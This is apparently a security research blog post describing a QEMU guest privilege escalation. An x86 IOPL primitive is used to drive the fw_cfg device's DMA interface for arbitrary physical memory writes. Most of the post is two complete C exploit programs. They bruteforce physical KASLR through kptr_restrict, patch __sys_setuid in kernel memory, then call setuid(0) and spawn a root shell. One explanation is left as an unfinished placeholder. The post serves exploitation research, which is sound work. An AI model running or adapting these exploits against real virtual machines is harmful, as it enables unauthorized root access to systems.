+++
title = 'pwning with... "QEMU"?'
date = 2025-08-22T15:00:00+02:00
draft = false
author = 'prosti & leave'
summary = "This post is about exploiting IOPL privilege escalation using QEMU's Firmware Configuration (fw_cfg) device."
tags = [
    'linux',
    'QEMU',
    'x86'
]
toc = true
+++

## Intro
In this post, we will talk about exploiting a weird x86 only primitive. We would recommend reading [this](https://thekidofarcrania.gitlab.io/2020/07/19/kernel-blues/) blog post before continuing with this one to better understand how I/O privilege levels work in x86.

## x86 IOPL
### I/O ports
There are two ways of interacting with physical devices:
1. **I/O ports**: this is the legacy way of doing it. There are a maximum of 2^16 ports used to interact with the different devices. These ports can be accessed using [in](https://www.felixcloutier.com/x86/in), [out](https://www.felixcloutier.com/x86/out) and all the different variants of these two instructions.
2. **MMIO** (Memory Mapped I/O): the more "modern" way of doing it. With this method you can directly read or write in a specific physical address that is shared with the target device.

Different types of devices exist but we are interested primarily in hard drives/CD-ROMS and potentially in devices that use DMA transfers.

### Internals
The [rflags](https://www.sandpile.org/x86/flags.htm) register has a two bit field called **IOPL** (I/O Privilege Level). If the **CPL** (Current Privilege Level) is lower than or equal to the thread's **IOPL** then the processor is enabled to interact with the ports. The other way to gain access to I/O ports is to modify **IOPB** or the corresponding bit mask in the [TSS](http://wiki.osdev.org/Task_State_Segment) (to better understand this read the article linked in "Intro").

Keep in mind that the address of the TSS is predictable so the second method could come in handy. For more information on this matter you can read **@leave**'s article on cpu entry area.

## Pwning
### Primitive
The primitive is simple: we can modify **IOPL** as we wish. In this case we will set it to 3 so that we can use all I/O ports from ring 3.

### Objective
The objective is to read **flag.txt** possibly without directly interacting with the device that stores the file itself, to make the exploit as volatile as possible.
Keep in mind that the we are testing exploits on QEMU and not on an actual device.

### Environment setup
For context, this is how we were running QEMU locally:
```sh
#!/bin/sh

qemu-system-x86_64 \
    -m 3.5G \
    -no-reboot \
    -nographic \
    -cpu host \
    -smp cores=2 \
    -kernel bzImage \
    -initrd initramfs.cpio.gz \
    -drive file=flag.txt,if=virtio,format=raw,readonly \
    -append "console=ttyS0 quiet kaslr=on" \
    -monitor tcp:127.0.0.1:4444,server,nowait \
    -s
```
The kernel's version is **6.14.0** but the exploit is not kernel version or build dependent and it also works with **KVM** enabled.

### Exploring different paths
Initially we dumped all the emulated devices from QEMU monitor with **info qtree**

We tried to interact with the emulated **PCI** device to read directly the flag but it is not a simple task to do for various reasons: 
- this path is device specific (it depends on what type of storage you are using)
- it's hard to gain privilege escalation
- it could require **MMIO** interaction

After wasting our time with the first path, we gave a second look at the list of emulated devices and this particular device caught **@prosti**'s attention...

### QEMU's fw-cfg emulated device
![fw-cfg device from QEMU monitor](/images/fw_cfg/fw_cfg_monitor.png)
Do you see it? **dma_enabled = true** kind of sticks out and for this reason I decided to get more information about the device. The best documentation that I found is from [OSDev](https://wiki.osdev.org/QEMU_fw_cfg) and [QEMU's official docs](https://www.qemu.org/docs/master/specs/fw_cfg.html) site. If you have time I'd recommend to read one of the two docs (it's a pretty short read).

**FW CFG** stands for Firmware Configuration. The device is used to easily pass files from the guest to the VM. As QEMU's documentation states:
> "This hardware interface allows the guest to retrieve various data items (blobs) that can influence how the firmware configures itself, or may contain tables to be installed for the guest OS. Examples include device boot order, ACPI and SMBIOS tables, virtual machine UUID, SMP and NUMA information, kernel/initrd images for direct (Linux) kernel booting, etc."

Interacting with the device is quite easy and can be done with PIO or MMIO. We will use three ports with fixed addresses

```c
#define FW_CFG_PORT_SEL     0x510 // 16-bit port
#define FW_CFG_PORT_DATA    0x511 // 8-bit port
#define BIOS_CFG_DMA_ADDR_HIGH  0x514 // 32-bit port
#define BIOS_CFG_DMA_ADDR_LOW   0x518 // 32-bit port
```

Each available blob of data or file is associated to a selector. To select the blob just write the selector's value in **FW_CFG_PORT_SEL**.
After that you can start reading the contents of the blob just by reading in loop from port **FW_CFG_PORT_DATA**.

These are the fixed selectors that are listed in OSDev's post:
```c
#define FW_CFG_SIGNATURE    0x0000
#define FW_CFG_ID           0x0001
#define FW_CFG_DIR          0x0019
```

To test if the device is actually present, read 4 bytes from FW_CFG_SIGNATURE. This should return the string "QEMU".

To gain information about the available additional files we will use the selector **FW_CFG_DIR**. The first four bytes read will be a 32-bit big-endian number which represents the number of available files. Immediately after the count, there is a sequence of entries of the following struct:

```c
  struct FWCfgFile {		/* an individual file entry, 64 bytes total */
      uint32_t size;		/* size of referenced fw_cfg item, big-endian */
      uint16_t select;		/* selector key of fw_cfg item, big-endian */
      uint16_t reserved;
      char name[56];		/* fw_cfg item name, NUL-terminated ascii */
  };
```

Dumping all the structures reveals that there is nothing interesting for us unfortunately but this raised a question: why is there a gap in OSDev's fixed selector list? Looking at QEMU's source code we found out that there are many other fixed selectors that are not well documented. Here is the complete list:

```c
#define FW_CFG_SIGNATURE	    0x00
#define FW_CFG_ID		        0x01
#define FW_CFG_UUID		        0x02
#define FW_CFG_RAM_SIZE		    0x03
#define FW_CFG_NOGRAPHIC	    0x04
#define FW_CFG_NB_CPUS		    0x05
#define FW_CFG_MACHINE_ID	    0x06
#define FW_CFG_KERNEL_ADDR	    0x07
#define FW_CFG_KERNEL_SIZE	    0x08
#define FW_CFG_KERNEL_CMDLINE	0x09
#define FW_CFG_INITRD_ADDR	    0x0a
#define FW_CFG_INITRD_SIZE	    0x0b
#define FW_CFG_BOOT_DEVICE	    0x0c
#define FW_CFG_NUMA		        0x0d
#define FW_CFG_BOOT_MENU	    0x0e
#define FW_CFG_MAX_CPUS		    0x0f
#define FW_CFG_KERNEL_ENTRY	    0x10
#define FW_CFG_KERNEL_DATA	    0x11
#define FW_CFG_INITRD_DATA	    0x12
#define FW_CFG_CMDLINE_ADDR	    0x13
#define FW_CFG_CMDLINE_SIZE	    0x14
#define FW_CFG_CMDLINE_DATA	    0x15
#define FW_CFG_SETUP_ADDR	    0x16
#define FW_CFG_SETUP_SIZE	    0x17
#define FW_CFG_SETUP_DATA	    0x18
#define FW_CFG_FILE_DIR		    0x19
```

This is more interesting! A lot of kernel pwn challenges in CTFs directly store the flag in **initramfs.cpio.gz** or **rootfs.cpio.gz**. Using **FW_CFG_INITRD_DATA** we can directly dump the contents of these files with ease. All the other selectors should just give us information that we should already know.

Happy? No. There is still one port that we haven't used: **FW_CFG_PORT_DMA**. PIO is not a fast way of reading large files, for this reason QEMU offers a way of transferring all the needed data in a single and fast DMA transfer.

This is the structure that we will use for the direct memory transfer:

```c
// fw_cfg DMA commands
typedef enum fw_cfg_ctl_t {
    fw_ctl_error = 1,
    fw_ctl_read = 2,
    fw_ctl_skip = 4,
    fw_ctl_select = 8,
    fw_ctl_write = 16 // this only works on QEMU version < 2.4
} fw_cfg_ctl_t;

typedef struct FWCfgDmaAccess {
    uint32_t control;
    uint32_t length;
    uint64_t address;
} FWCfgDmaAccess;
```

To check if DMA transfers are enable you have to read from the selector **FW_CFG_ID** and check if the second bit is active.

To setup the DMA transfer we have to store our **FWCfgDmaAccess** structure at a known physical memory address.
- **control** specifies what command you want to execute and in some cases the selector that you want to use.
- **length** is used for **fw_ctl_read**, to specify how many bytes you want to read, and **fw_ctl_skip**, to specify how many bytes you want to advance the seek position through the file.
- **address** is only used for **fw_ctl_read** and contains the destination physical address.

After setting up the structure we just have to write its physical address to **FW_CFG_PORT_DMA_{LOW,HIGH}** and that's it! By changing the seek position of a blob of data (let's say initrd because it's big enough to contain all bytes from 0 to 255) we can write an arbitrary byte to an arbitrary physical address.  

At this point we have to find a place to store our **FWCfgDmaAccess** structure. Turns out that finding a fixed physical address with user controlled data is trivial because **[inserire spiegazione]**. 

Now with arbitrary physical write we can use the same oracle used to solve the challenge [/dev/mem](https://kqx.io/writeups/dev_mem/) (using **kptr_restrict**) to find the kernel's physical address. At that point we can patch **__sys_setuid** to grant any user root.

Here is the exploit written by **@prosti** (this one doesn't use **ptregs** because it's meant to be a small POC so instead I'm using **/proc/self/pagemap**):
```c
#include "helpers.h"
#include <sys/io.h>
#include <endian.h>
#include <arpa/inet.h>
#include <string.h>

// PWN CONSTANTS
#define CONFIG_PHYSICAL_START   0x1000000ul
#define CONFIG_PHYSICAL_ALIGN   0x0200000ul

#define KPTR_RESTRICT           "/proc/sys/kernel/kptr_restrict"
#define KPTR_RESTRICT_OFFSET    0x1eb93a0ul

#define SETUID_CHECK            0x02b960dul
#define SETUID_PATCH            0x75        // je -> jne

// CFG PORTS
#define FW_CFG_PORT_SEL         0x510
#define FW_CFG_PORT_DATA        0x511
#define BIOS_CFG_DMA_ADDR_HIGH  0x514
#define BIOS_CFG_DMA_ADDR_LOW   0x518

#define FW_CFG_SIGNATURE	    0x00
#define FW_CFG_ID		        0x01
#define FW_CFG_UUID		        0x02
#define FW_CFG_RAM_SIZE		    0x03
#define FW_CFG_NOGRAPHIC	    0x04
#define FW_CFG_NB_CPUS		    0x05
#define FW_CFG_MACHINE_ID	    0x06
#define FW_CFG_KERNEL_ADDR	    0x07
#define FW_CFG_KERNEL_SIZE	    0x08
#define FW_CFG_KERNEL_CMDLINE	0x09
#define FW_CFG_INITRD_ADDR	    0x0a
#define FW_CFG_INITRD_SIZE	    0x0b
#define FW_CFG_BOOT_DEVICE	    0x0c
#define FW_CFG_NUMA		        0x0d
#define FW_CFG_BOOT_MENU	    0x0e
#define FW_CFG_MAX_CPUS		    0x0f
#define FW_CFG_KERNEL_ENTRY	    0x10
#define FW_CFG_KERNEL_DATA	    0x11
#define FW_CFG_INITRD_DATA	    0x12
#define FW_CFG_CMDLINE_ADDR	    0x13
#define FW_CFG_CMDLINE_SIZE	    0x14
#define FW_CFG_CMDLINE_DATA	    0x15
#define FW_CFG_SETUP_ADDR	    0x16
#define FW_CFG_SETUP_SIZE	    0x17
#define FW_CFG_SETUP_DATA	    0x18
#define FW_CFG_FILE_DIR		    0x19


// https://wiki.osdev.org/QEMU_fw_cfg
struct FWCfgFile {
    uint32_t size;		/* size of referenced fw_cfg item, big-endian */
    uint16_t select;	/* selector key of fw_cfg item, big-endian */
    uint16_t reserved;
    char name[56];		/* fw_cfg item name, NUL-terminated ascii */   
};

// fw_cfg DMA commands
typedef enum fw_cfg_ctl_t {
    fw_ctl_error = 1,
    fw_ctl_read = 2,
    fw_ctl_skip = 4,
    fw_ctl_select = 8,
    fw_ctl_write = 16
} fw_cfg_ctl_t;

typedef struct FWC_fg_dma_access {
    uint32_t control;
    uint32_t length;
    uint64_t address;
} FWC_fg_dma_access;

uint8_t* initrd_cache = NULL;

uint64_t get_physical_addr(uint64_t virt_addr) {
    int page_size = getpagesize();
    uint64_t page_offset = virt_addr % page_size;
    uint64_t virt_page_index = virt_addr / page_size;

    // Open pagemap
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1) {
        perror("open pagemap");
        return -1;
    }

    // Seek to the entry in pagemap
    uint64_t entry;
    if (lseek(fd, virt_page_index * sizeof(entry), SEEK_SET) == -1) {
        perror("lseek pagemap");
        close(fd);
        return -1;
    }

    if (read(fd, &entry, sizeof(entry)) != sizeof(entry)) {
        perror("read pagemap");
        close(fd);
        return -1;
    }

    close(fd);

    // Check if page is present
    if (!(entry & (1ULL << 63))) {
        fprintf(stderr, "Page not present\n");
        return -1;
    }

    // PFN is bits 0-54 (if present)
    uint64_t pfn = entry & ((1ULL << 55) - 1);
    uint64_t phys_addr = (pfn * page_size) + page_offset;

    return phys_addr;
}

//
// returns physical address of a valid cmd struct and initializes it
//
uint64_t default_get_cmd(uint32_t control, uint64_t address, uint32_t length){
    FWC_fg_dma_access* cmd = calloc(1, sizeof(FWC_fg_dma_access));
    cmd->control = htonl(control);
    cmd->address = htobe64(address);
    cmd->length = htonl(length);
    return get_physical_addr((uint64_t)cmd);
}

uint32_t get_initrd_size(){
    uint32_t initrd_size = 0;

    outw(FW_CFG_INITRD_SIZE, FW_CFG_PORT_SEL);
    for(int i = 0; i < 0x4; ++i)
        *((int8_t *)&initrd_size + i) = inb(FW_CFG_PORT_DATA);
    
    return initrd_size;
}
uint8_t* read_initrd(){
    uint32_t initrd_size;
    uint8_t* initrd_data;

    if(initrd_cache != NULL)
        return initrd_cache;

    initrd_size = get_initrd_size();
    initrd_data = calloc(1, initrd_size);

    if(initrd_data == NULL)
        return NULL;
    
    outw(FW_CFG_INITRD_DATA, FW_CFG_PORT_SEL);
    for(int i = 0; i < initrd_size; ++i)
        initrd_data[i] = inb(FW_CFG_PORT_DATA);
    
    initrd_cache = initrd_data;
    return initrd_data;
}

int arbw(uint64_t phys_addr, uint8_t value, uint64_t (* get_cmd)(uint32_t, uint64_t, uint32_t)){
    uint64_t cmd_physaddr;
    uint32_t cmd_physaddr_lo;
    uint32_t cmd_physaddr_hi;

    uint64_t byte_addr;
    uint32_t byte_off;
    
    uint32_t initrd_size;
    uint8_t* initrd_data;
    
    //
    // Find the target byte in initrd
    //
    initrd_size = get_initrd_size();
    initrd_data = read_initrd();    

    byte_addr = (uint64_t)memmem(initrd_data, initrd_size, &value, sizeof(uint8_t));
    
    if(byte_addr == 0)
        return 0;
    
    byte_off = byte_addr - (uint64_t)initrd_data;

    //
    // Skip
    //
    if(get_cmd == NULL)
        cmd_physaddr = default_get_cmd(fw_ctl_skip | fw_ctl_select | (FW_CFG_INITRD_DATA << 16), 0, byte_off);
    else
        cmd_physaddr = get_cmd(fw_ctl_skip | fw_ctl_select | (FW_CFG_INITRD_DATA << 16), 0, byte_off);
    
    cmd_physaddr_lo = (uint32_t)(cmd_physaddr & 0xFFFFFFFFU);
    cmd_physaddr_hi = (uint32_t)(cmd_physaddr >> 32);

    outl(htonl(cmd_physaddr_hi), BIOS_CFG_DMA_ADDR_HIGH);
    outl(htonl(cmd_physaddr_lo), BIOS_CFG_DMA_ADDR_LOW);
    

    //
    // 1 byte DMA transfer
    //
    if(get_cmd == NULL)
        cmd_physaddr = default_get_cmd(fw_ctl_read | (FW_CFG_INITRD_DATA << 16), phys_addr, 1);
    else
        cmd_physaddr = get_cmd(fw_ctl_read | (FW_CFG_INITRD_DATA << 16), phys_addr, 1);
    
    cmd_physaddr_lo = (uint32_t)(cmd_physaddr & 0xFFFFFFFFU);
    cmd_physaddr_hi = (uint32_t)(cmd_physaddr >> 32);

    outl(htonl(cmd_physaddr_hi), BIOS_CFG_DMA_ADDR_HIGH);
    outl(htonl(cmd_physaddr_lo), BIOS_CFG_DMA_ADDR_LOW);

    return 1;
}

uint32_t check_kptr_restrict(){
    uint32_t r;
    FILE* f;
    f = fopen(KPTR_RESTRICT, "rb");
    fscanf(f, "%d", &r);
    fclose(f);
    return r;
}

int main(int argc, char** argv)
{       
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    // to gain this you need an actual vuln
    ioperm(0, 0xffff, 1);

    // phys kaslr bruteforce (using kptr_restrict as oracle)
    puts("start of bruteforce");
    uint64_t phys_kbase;
    for(phys_kbase = CONFIG_PHYSICAL_START + CONFIG_PHYSICAL_ALIGN * 0x10000; phys_kbase >= CONFIG_PHYSICAL_START; phys_kbase -= CONFIG_PHYSICAL_ALIGN){
        if(!arbw(phys_kbase + KPTR_RESTRICT_OFFSET, 0xaa, NULL))
            goto err;
    }
    printf("phys kbase @ %p\n", phys_kbase);

    if(!arbw(phys_kbase + SETUID_CHECK, SETUID_PATCH, NULL))
        goto err;

    puts("pwned");
    return 0;

    err:
    puts("exploit failed");
    return 1;
}
```

## Extra pwning
Happy now? Not quite. 

Turns out that we can store the string "QEMU" (or any substring) in an arbitrary physical address. This can be done by using the selector for the signature (**FW_CFG_SIGNATURE**). 

Wouldn't it be funny if we could just... pwn the challenge by using that?
Fun fact: you obviously can!

'E' is 0x45 and 'M' is 0x4d. If you disassemble these two bytes you will have:

![disassembled bytes](/images/fw_cfg/disass.png)

These two bytes are REX prefixes. If the prefix does not have an effect on the next bytes then it is treated as a NOP instruction. By looking at the source code of [__sys_setuid](https://elixir.bootlin.com/linux/v6.16.2/source/kernel/sys.c#L622) you can notice that we could successfully hijack the syscall by "NOPing" out the call to **ns_capable_setid**.

These are the instructions before patching the syscall:

![setuid before patch](/images/fw_cfg/setuid_before.png)

And this is the function call after patching **setuid**:

![setuid after patch](/images/fw_cfg/setuid_after.png)

As you can notice, the last rex.RB prefix actually changed **test al, al** to **test r8b, r8b** but it's not a problem. Using gdb you can see that r8b is not 0 at run time so the if condition is passed!

Here is the final exploit (written by **@leave**, this one uses **ptregs**):

```c
#include "helpers.h"
#include <sys/io.h>
#include <endian.h>
#include <sys/syscall.h>
#include <signal.h>

#include <asm/ldt.h>

#define WRITE_LDT 1

#define CONFIG_PHYSICAL_START   0x1000000ul
#define CONFIG_PHYSICAL_ALIGN   0x0200000ul

#define KPTR_RESTRICT           "/proc/sys/kernel/kptr_restrict"
#define KPTR_RESTRICT_OFFSET    0x1eb93a0ul

#define SETUID_CHECK            0x02b960dul

// CFG PORTS
#define FW_CFG_PORT_SEL         0x510
#define FW_CFG_PORT_DATA        0x511

#define BIOS_CFG_DMA_ADDR_HIGH  0x514
#define BIOS_CFG_DMA_ADDR_LOW   0x518

#define FW_CFG_SIGNATURE	    0x00
#define SIGNATURE               "QEMU"

#define SP0_PTREGS_PHYS_ADDR    0xf60cf58;				// depends on memory size, im running with 256M


// https://wiki.osdev.org/QEMU_fw_cfg


// fw_cfg DMA commands
typedef enum fw_cfg_ctl_t {
    fw_ctl_error = 1,
    fw_ctl_read = 2,
    fw_ctl_skip = 4,
    fw_ctl_select = 8,
    fw_ctl_write = 16
} fw_cfg_ctl_t;

typedef struct FWCfgDmaAccess {
    uint32_t control;
    uint32_t length;
    uint64_t address;
} FWCfgDmaAccess;

void sigfpe_handler(int sig, siginfo_t *si, void *context) {
    ucontext_t *uc = (ucontext_t *)context;

    uc->uc_mcontext.gregs[REG_RIP] += 3;
}

uint64_t sp0_get_cmd(uint32_t control, uint64_t address, uint32_t length) {
    control = htonl(control);
    address = htobe64(address);
    length = htonl(length);

    asm volatile(
        ".intel_syntax noprefix\n"
        "mov r15d, %1\n"
        "shl r15, 32\n"
        "mov r14d, %0\n"
        "or r15, r14\n"
        "mov r14, %2\n"
        "mov rax, 0\n"
        "div rax\n"
        ".att_syntax prefix\n"
        :
        : "r" (control), "r" (length), "r" (address)
        : "rax", "r14", "r15"
    );

    return SP0_PTREGS_PHYS_ADDR;
}

int arbw(uint64_t phys_addr, char* value, int size){
    uint64_t cmd_physaddr;
    uint32_t cmd_physaddr_lo;
    uint32_t cmd_physaddr_hi;

    uint64_t byte_addr;
    uint32_t byte_off;

    byte_addr = (uint64_t)memmem(SIGNATURE, sizeof(SIGNATURE), value, size);
    
    if(byte_addr == 0)
        return 0;
    
    byte_off = byte_addr - (uint64_t)SIGNATURE;

    //
    // Skip
    //
    cmd_physaddr = sp0_get_cmd(fw_ctl_skip | fw_ctl_select | (FW_CFG_SIGNATURE << 16), 0, byte_off);
    
    cmd_physaddr_lo = (uint32_t)(cmd_physaddr & 0xFFFFFFFFU);
    cmd_physaddr_hi = (uint32_t)(cmd_physaddr >> 32);

    if (cmd_physaddr_hi)
        outl(htonl(cmd_physaddr_hi), BIOS_CFG_DMA_ADDR_HIGH);
    outl(htonl(cmd_physaddr_lo), BIOS_CFG_DMA_ADDR_LOW);
    

    //
    // 1 byte DMA transfer
    //
    cmd_physaddr = sp0_get_cmd(fw_ctl_read | (FW_CFG_SIGNATURE << 16), phys_addr, size);
    
    cmd_physaddr_lo = (uint32_t)(cmd_physaddr & 0xFFFFFFFFU);
    cmd_physaddr_hi = (uint32_t)(cmd_physaddr >> 32);

    if (cmd_physaddr_hi)
        outl(htonl(cmd_physaddr_hi), BIOS_CFG_DMA_ADDR_HIGH);
    outl(htonl(cmd_physaddr_lo), BIOS_CFG_DMA_ADDR_LOW);


    return 0;
}

uint32_t check_kptr_restrict(){
    uint32_t r;
    FILE* f;
    f = fopen(KPTR_RESTRICT, "rb");
    fscanf(f, "%d", &r);
    fclose(f);
    return r;
}

void fw_cfg() {
    uint64_t phys_kbase;
    for (phys_kbase = CONFIG_PHYSICAL_START + CONFIG_PHYSICAL_ALIGN * 0x1000; phys_kbase >= CONFIG_PHYSICAL_START; phys_kbase -= CONFIG_PHYSICAL_ALIGN){
        arbw(phys_kbase + KPTR_RESTRICT_OFFSET, SIGNATURE, sizeof(SIGNATURE));
        if(check_kptr_restrict() != 0)
            break;
    }
    printf("phys kbase @ %p\n", phys_kbase);

    arbw(phys_kbase + SETUID_CHECK+0, "E", 1);
    arbw(phys_kbase + SETUID_CHECK+1, "M", 1);
    arbw(phys_kbase + SETUID_CHECK+2, "E", 1);
    arbw(phys_kbase + SETUID_CHECK+3, "M", 1);
    arbw(phys_kbase + SETUID_CHECK+4, "E", 1);
    
    setuid(0);
    system("/bin/sh");
}

int main() {   
    // ioperm(0, 0xffff, 1);

    struct sigaction sa_fpe = {0};
    sa_fpe.sa_sigaction = sigfpe_handler;
    sa_fpe.sa_flags = SA_SIGINFO;
    sigaction(SIGFPE, &sa_fpe, NULL);

    fw_cfg();
	

    hlt("finished");
    return 0;
}
```

## Final notes
We had lots of fun exploiting this weird primitive! The next step is to find a universal exploit that works without relying on a QEMU specific hardware interface. If you have any suggestions to improve the exploit just contact us on Discord or other social media!